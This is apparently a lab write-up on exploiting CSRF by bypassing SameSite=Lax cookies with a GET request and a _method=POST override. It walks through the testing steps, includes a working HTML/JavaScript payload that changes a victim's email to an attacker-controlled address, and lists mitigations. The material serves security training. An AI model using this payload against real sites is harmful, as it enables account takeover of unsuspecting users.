# Lab07 - SameSite Lax Bypass Via Method Override

## Objective

Exploit a CSRF vulnerability by bypassing SameSite=Lax cookie restrictions using a GET request and HTTP method override.

---

# Lab Difficulty

```text
Practitioner
```

---

# Vulnerability Overview

The application relies on browser SameSite behavior for CSRF protection.

The session cookie is not explicitly configured with a SameSite attribute.

As a result:

```text
Browser Applies

SameSite=Lax
```

by default.

The application also supports:

```http
_method=POST
```

allowing attackers to convert GET requests into POST actions.

---

# Root Cause

Multiple weaknesses combine:

```text
No CSRF Token
        +
SameSite=Lax
        +
Method Override
```

---

# Analysis

Captured request:

```http
POST /my-account/change-email

email=test@example.com
```

Observations:

- No CSRF token
- Cookie-based authentication
- State-changing functionality

---

# Cookie Analysis

Login response:

```http
Set-Cookie: session=abc123
```

No SameSite attribute present.

Browser applies:

```text
SameSite=Lax
```

automatically. :contentReference[oaicite:0]{index=0}

---

# Testing Method Override

Convert:

```http
POST
```

to:

```http
GET
```

Request fails.

---

Add:

```http
_method=POST
```

Request succeeds.

---

# Attack Methodology

```text
Capture POST Request
        ↓
Convert To GET
        ↓
Add _method=POST
        ↓
Generate Top-Level Navigation
        ↓
Cookie Included
        ↓
Email Changed
```

---

# Exploitation Steps

### Step 1

Capture:

```http
POST /my-account/change-email
```

---

### Step 2

Verify no CSRF token exists.

---

### Step 3

Convert request to GET.

---

### Step 4

Add:

```http
_method=POST
```

---

### Step 5

Confirm request succeeds.

---

### Step 6

Create exploit:

```html
<script>
document.location =
"https://TARGET/my-account/change-email?email=hacker@evil.com&_method=POST";
</script>
```

---

### Step 7

Host exploit on exploit server.

---

### Step 8

Deliver exploit.

---

# Why The Attack Works

Browser behavior:

```text
SameSite=Lax
```

allows:

```text
Top-Level GET Navigation
```

to include session cookies.

The application then treats the request as:

```text
POST
```

because of method override.

---

# Mitigation

Applications should:

- Use CSRF tokens
- Disable method override for sensitive endpoints
- Validate Origin header
- Validate Referer header

---

# Related Theory

- `11-how-does-samesite-work.md`
- `12-bypassing-samesite-lax-restrictions-using-get-requests.md`

---

# Key Learnings

- SameSite=Lax does not stop all CSRF attacks.
- GET navigations still include cookies.
- Method override often introduces bypass opportunities.

> [!WARNING]
> Never assume SameSite=Lax provides complete CSRF protection.